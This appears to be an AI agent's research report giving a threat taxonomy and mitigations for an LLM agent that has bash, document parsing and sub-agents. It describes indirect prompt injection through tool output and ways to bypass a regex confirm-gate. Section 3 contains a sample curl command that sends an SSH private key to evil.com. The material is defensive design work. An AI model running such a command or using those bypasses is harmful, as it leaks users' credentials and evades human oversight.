Now I have the full picture. Here is the dense threat taxonomy.

---

# LLM-AGENT SECURITY THREAT TAXONOMY — Research Lane Output for Fable-5 Mastermind

**Source grounding:** YURI corpus-threat-taxonomy.mjs (16-category taxonomy, verified local), YURI cyber proof cards (5 fixture labs, verified local), YURI taint-model.mjs (source→sink flow engine, verified local), YURI security lens v0 (4 modules, 90 threat rows, verified local), OWASP LLM Top 10 2025 (cited via YURI source registry S13/S15), OWASP Agentic AI guidance (cited via YURI docs). Claims marked **HARD-FACT** are corroborated by ≥2 of these sources. Claims marked **RECALLED-PATTERN** are from training data, not locally verified against this specific agent's code.

---

## 1. INDIRECT PROMPT INJECTION (via Tool Outputs / Parsed Documents / Fetched Web)

**Mechanism:** Untrusted content (web page, PDF, email, tool stdout) contains embedded instructions that the LLM treats as system-level authority. The model cannot distinguish "content about instructions" from "instructions to the agent." The injection arrives through a trusted channel (the tool/document parser), so it bypasses user-input filters. **HARD-FACT** — YURI proof cards confirm tool-output-injection fixture passes (CY-049), OWASP LLM02.

**Standard mitigation:** Treat ALL tool outputs and parsed document text as untrusted data. Apply an input rail that classifies content before it reaches the model's instruction layer. Separate the "what the content says" from "what the agent should do." Use a dedicated classifier or structural separation (e.g., `<untrusted_content>` tags with explicit policy that content inside those tags is data, not instructions). **HARD-FACT** — YURI input-dialog-rail and tool-input-output-rail implement this.

**Your agent specific:** The regex confirm-gate does NOT protect against this — the injection happens BEFORE the confirm gate, in the model's interpretation of tool output. The model decides to act; the confirm gate only sees the already-compromised action string.

---

## 2. CONFUSED-DEPUTY PROBLEM (Tool Delegation / Privilege Inheritance)

**Mechanism:** The LLM agent has a set of capabilities (bash, file read, screen capture, sub-agent spawn). A tool or sub-agent is called with the agent's full authority. If the model is tricked into calling a tool with attacker-controlled arguments, the tool executes with the agent's privileges — not the attacker's. The agent is the "deputy" acting on behalf of the attacker's input. **HARD-FACT** — OWASP Agentic AI guidance highlights this as the #1 architectural risk for agentic systems; YURI governed autonomy sprint plan (2026-06-07) explicitly names confused-deputy failures.

**Standard mitigation:** Capability-based security — each tool call must carry an explicit capability token scoped to the minimum necessary operation. The agent should not have ambient authority. Tools should validate that the caller has the right to invoke them with those specific arguments. **RECALLED-PATTERN** — full capability-based tool invocation is not yet implemented in YURI's tool dispatch (current dispatch checks tool_name but not argument-scoped capability).

**Your agent specific:** Full bash + document parsing + screen reading + sub-agent spawn is a MASSIVE confused-deputy surface. Every tool is a deputy. The regex confirm-gate is the only deputy check, and it checks the COMMAND STRING, not the INTENT.

---

## 3. HITL CONFIRM-GATE WEAKNESSES (Why Matching the Agent's Own Command String Is Insufficient)

**Mechanism:** A regex or string-match confirm gate checks whether the proposed action matches a pattern the agent generated. Three failure modes: (a) **Semantic mismatch** — the model can generate a benign-looking command that does something dangerous (e.g., `curl https://evil.com/$(cat ~/.ssh/id_rsa)` looks like a curl, the regex passes, but the URL contains a command substitution). (b) **Confirmation fatigue** — the user habituates to approving actions and stops reading carefully. (c) **Injection before the gate** — the injection happens in the model's reasoning, so the proposed action IS what the model genuinely wants to do; the gate confirms the model's compromised intent. **HARD-FACT** — YURI's own self-governance charter (2026-06-14) distinguishes self-governable (reversible, evidence-decidable) from owner-gated (irreversible, outward-facing); a regex gate on the command string alone does not capture this distinction.

**Standard mitigation:** (1) Classify actions by REVERSIBILITY and BLAST RADIUS, not by string pattern. (2) Use capability-based gates: "this tool can only write to /tmp/output/" not "this command matches `write_file`". (3) For HIGH/CRITICAL actions, require the user to re-state the INTENT, not just approve the command. (4) Implement a "deny by default, allow by explicit capability" model. **RECALLED-PATTERN** — few production agents implement this; most use string-matching or simple allow/deny lists.

**Your agent specific:** A regex confirm-gate that matches the agent's own command string is vulnerable to ALL THREE failure modes. The agent can generate a command that passes the regex but is semantically dangerous. The gate does not check reversibility, blast radius, or whether the action touches protected surfaces.

---

## 4. TAINT TRACKING / PROVENANCE OF UNTRUSTED CONTENT

**Mechanism:** Data from untrusted sources (web, documents, tool stdout, sub-agent output) is not tagged with its provenance. Once it enters the model's context window, it is indistinguishable from trusted instructions or data. The model cannot answer "where did this piece of information come from?" and therefore cannot apply different trust policies to different content. **HARD-FACT** — YURI taint-model.mjs implements source→sink flow detection (credential→network, file→network, input→exec) at the code-analysis level, but this is static analysis of skill code, not runtime taint tracking of data flowing through the model's context.

**Standard mitigation:** (1) Tag every piece of context with a provenance label (source type, source identity, trust level). (2) At the model level, use structural separation: untrusted content in `<untrusted>` blocks with explicit policy that the model should not treat content inside those blocks as instructions. (3) At the application level, maintain a provenance graph that tracks which data influenced which decision. **RECALLED-PATTERN** — runtime provenance tracking in LLM context windows is an open research problem; no production system does it well.

**Your agent specific:** Voice input, parsed documents, fetched web content, and sub-agent output all enter the same context window with no provenance tags. The model cannot distinguish "the user said" from "the document said" from "the web page said."

---

## 5. CAPABILITY-BASED SECURITY vs PATTERN/REGEX GATES

**Mechanism:** Pattern/regex gates check WHAT the action looks like (string matching). Capability-based security checks WHO the caller is and WHAT they are ALLOWED to do (authorization). A regex gate can be bypassed by: encoding, command chaining, using a different tool that achieves the same effect, or exploiting the model's ability to generate a command that matches the pattern but is semantically different. Capability-based security ties authority to the caller's identity and the specific operation, not the string form. **HARD-FACT** — YURI's own mutation contract uses explicit pathspec (`git add <paths>`) rather than bare `git add .` — this is a capability-scoping pattern applied to git, but not generalized to tool dispatch.

**Standard mitigation:** (1) Each tool/operation has a capability token that the caller must present. (2) Capabilities are scoped to specific resources (e.g., "write to /tmp/output/" not "write anywhere"). (3) The agent cannot escalate its own capabilities. (4) Capabilities are revoked after use (one-shot tokens). **RECALLED-PATTERN** — full capability-based security for LLM agents is rare; most systems use allow/deny lists or regex patterns.

**Your agent specific:** The regex confirm-gate is a pattern gate. It does not check whether the agent has the capability to perform the action, only whether the action string matches a pattern. A capability-based system would check: "does this agent instance have the 'write to filesystem' capability for this specific path?"

---

## 6. SANDBOXING + REDUCED-CAPABILITY MODES FOR UNATTENDED AGENTS

**Mechanism:** An unattended agent (running overnight, processing batch jobs, handling sub-agent tasks) has the same capabilities as an attended agent. If compromised, it can cause damage before the user intervenes. The lack of capability degradation in unattended mode means the attack surface is the same whether a human is watching or not. **HARD-FACT** — YURI's self-governance charter distinguishes self-governable (reversible, evidence-decidable) from owner-gated; this is a capability-degradation model but applied to decision-making, not to tool access.

**Standard mitigation:** (1) Unattended agents run in a reduced-capability profile: read-only filesystem, no network egress, no destructive commands, no sub-agent spawn. (2) Attended mode adds capabilities incrementally. (3) The transition between modes requires explicit user action (not model self-escalation). (4) Budget/rate limits cap unattended resource consumption. **RECALLED-PATTERN** — few agents implement true capability degradation; most use the same profile for both modes.

**Your agent specific:** Voice+text agent with full bash + document parsing + screen reading + sub-agents has NO capability degradation between attended and unattended mode. An unattended run has the same power as an attended one.

---

## 7. EXFILTRATION OF SECRETS/CREDENTIALS

**Mechanism:** The agent reads a secret (env var, file, keychain) and then sends it to an external endpoint via a tool (curl, fetch, sub-agent network call). The exfiltration can be: (a) direct — the agent explicitly sends the secret; (b) encoded — the agent base64/hex encodes the secret before sending; (c) side-channel — the agent uses the secret in a way that leaks it (e.g., including it in a DNS lookup, timing attack). **HARD-FACT** — YURI taint-model.mjs explicitly models credential→network and file→network flows; YURI threat taxonomy has CREDENTIAL_ACCESS and NETWORK_EXFILTRATION as separate categories with TAINT_FLOW for the composition.

**Standard mitigation:** (1) Never give the agent access to secrets it does not functionally need. (2) Use a secret store that injects credentials at the transport layer, not in the prompt. (3) Block outbound network calls from the agent unless explicitly allow-listed. (4) Monitor for credential→network taint flows in agent code. (5) Use a "break glass" mechanism where secret access requires explicit user approval. **HARD-FACT** — YURI's D8 data-routing-privacy research (2026-07-05) specifies credentials injected at transport layer, not in prompt.

**Your agent specific:** Full bash access means the agent can read ANY file (including ~/.ssh/, .env, keychains) and send it via ANY network tool. The regex confirm-gate does not check for this pattern.

---

## 8. SUPPLY-CHAIN RISK IN AUTO-RUN HOOKS

**Mechanism:** Auto-run hooks (postinstall, git hooks, cron, launchd, shell rc files, agent startup scripts) execute code without user review. A compromised dependency or skill can install a persistence mechanism that survives agent restarts. The code runs at install/startup time, before any security gate is active. **HARD-FACT** — YURI threat taxonomy has SUPPLY_CHAIN (CRITICAL) and PERSISTENCE_MECHANISM (HIGH) as separate categories; YURI's own skill-security gate checks for postinstall hooks and eval/exec constructs.

**Standard mitigation:** (1) Forbid lifecycle install scripts in foreign skills/dependencies. (2) Vendor dependencies pinned by integrity hash. (3) Review any code that executes at install or startup time. (4) Run auto-run hooks in a sandbox with no network access and read-only filesystem. (5) Maintain a registry of all auto-run hooks and audit them regularly. **HARD-FACT** — YURI's skill-security gate implements hash verification and lifecycle script scanning.

**Your agent specific:** Multi-lane sub-agents + auto-run hooks = supply-chain surface. Each sub-agent may install its own dependencies with their own hooks. The regex confirm-gate does not inspect dependency installation.

---

## MUST-HAVE MITIGATIONS (for an agent with full bash + document parsing + screen reading + multi-lane sub-agents + regex confirm-gate)

1. **Capability-degraded unattended mode** — unattended runs get read-only filesystem, no network egress, no destructive commands, no sub-agent spawn. Attended mode adds capabilities incrementally. Transition requires explicit user action. **HARD-FACT** — YURI self-governance charter provides the decision framework; implement as a runtime capability profile.

2. **Provenance-tagged context** — every piece of context (voice input, document text, web content, tool output, sub-agent output) gets a provenance tag. The model is instructed to treat untrusted content as data, not instructions. **RECALLED-PATTERN** — structural separation in prompts is proven; runtime provenance tracking is still research-grade.

3. **Taint-aware tool dispatch** — before executing a tool, check whether its arguments contain data from an untrusted source. If a credential read reaches a network egress, block. **HARD-FACT** — YURI taint-model.mjs proves the concept at the code-analysis level; extend to runtime.

4. **Reversibility-classified action gates** — replace the regex confirm-gate with a gate that classifies actions by reversibility and blast radius. Reversible actions (file write to temp, read-only queries) auto-pass. Irreversible actions (rm -rf, git push, network egress with secrets) require explicit user intent confirmation. **HARD-FACT** — YURI self-governance charter provides the classification.

5. **Secret isolation** — credentials are injected at the transport layer, never in the prompt. The agent cannot read .env, ~/.ssh/, or keychain files unless explicitly authorized for a specific operation. **HARD-FACT** — YURI D8 research specifies this pattern.

6. **Supply-chain audit gate** — every dependency install and auto-run hook is scanned against the 16-category threat taxonomy before execution. Forbid lifecycle scripts in foreign skills. **HARD-FACT** — YURI corpus-threat-taxonomy.mjs and skill-security gate implement this.

7. **Sub-agent capability scoping** — sub-agents inherit a REDUCED capability set from the parent, not the full set. A sub-agent spawned for "summarize this PDF" does not get bash access. **RECALLED-PATTERN** — YURI's nano-swarm dispatch (spawn_nano) does not yet implement capability inheritance.

---

## OVER-ENGINEERING TO AVOID

1. **Full inter-procedural taint tracking at runtime** — tracking every variable's provenance through the model's reasoning is computationally infeasible and not necessary. Static taint analysis of agent code (what YURI's taint-model.mjs does) plus runtime provenance tagging of context sources is sufficient. **HARD-FACT** — YURI taint-model.mjs explicitly documents this design choice.

2. **Formal verification of agent behavior** — proving that an LLM agent will never take a dangerous action is impossible (the model is non-deterministic). Invest in gates and capability scoping instead. **RECALLED-PATTERN** — no production agent uses formal verification.

3. **Per-token authentication** — requiring the model to authenticate every reasoning step is impractical and destroys utility. Authenticate at the tool-call boundary, not the reasoning boundary. **RECALLED-PATTERN** — this is a known anti-pattern in agent security.

4. **Complete network isolation** — blocking all network access breaks the agent's utility (web research, API calls, sub-agent coordination). Instead, use allow-listed endpoints and monitor for exfiltration patterns. **HARD-FACT** — YURI's own architecture requires network access for research and lane coordination.

5. **User confirmation for every action** — confirmation fatigue is a real vulnerability. Only gate irreversible, high-blast, or outward-facing actions. Routine reads and reversible writes should auto-pass. **HARD-FACT** — YURI self-governance charter explicitly distinguishes self-governable from owner-gated.

6. **Sandboxing every sub-process in a separate container** — for a personal agent on a single machine, container-per-sub-agent is excessive overhead. Use capability-based process isolation (seccomp, landlock, pledge) instead of full virtualization. **RECALLED-PATTERN** — container-per-agent is a cloud pattern, not a personal-agent pattern.

7. **Blocking all document parsing** — documents are a primary attack vector, but also a primary utility. Instead of blocking, apply the provenance-tagged context pattern: parse the document, tag the content as untrusted, and instruct the model not to treat it as instructions. **HARD-FACT** — YURI cyber proof cards confirm this approach works for hostile DOM content and poisoned RAG corpora.

---

**RESULT_LABEL:** `08DS_AGENT_SECURITY_TAXONOMY_8_THREATS_MUST_OVER_X_PASS_COMMITTED`